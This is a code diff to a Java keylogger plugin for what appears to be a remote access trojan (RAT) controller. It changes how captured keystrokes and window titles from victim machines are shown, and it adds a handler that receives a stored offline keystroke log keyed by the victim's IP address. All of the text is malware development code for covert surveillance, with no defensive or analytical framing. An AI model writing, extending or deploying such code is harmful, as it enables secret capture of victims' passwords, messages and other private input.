@@ -69,13 +69,13 @@ public class KeyloggerPlugin extends RATPlugin {
 					}
 
 					if (panel != null) {
-						panel.append(key);
+						panel.appendOnline(key);
 					}
 				} else {
 					String title = dis.readUTF();
 
 					if (panel != null) {
-						panel.append("[Window: " + title + "]");
+						panel.appendOnline("[Window: " + title + "]");
 					}
 				}
 			}
@@ -108,6 +108,18 @@ public class KeyloggerPlugin extends RATPlugin {
 			
 			for (int i = 0; i < panel.getTree().getRowCount(); i++) {
 				panel.getTree().expandRow(i);
+			}
+		} else if (event.getPacket().getHeader() == LOG_HEADER) {
+			int length = dis.readInt();
+			StringBuilder builder = new StringBuilder();
+			for (int i = 0; i < length; i++) {
+				builder.append(dis.readChar());
+			}
+			
+			PanelKeylogger panel = (PanelKeylogger)entry.instances.get(event.getServer().getIP());
+
+			if (panel != null) {
+				panel.setOfflineLog(builder.toString());
 			}
 		}
 	}
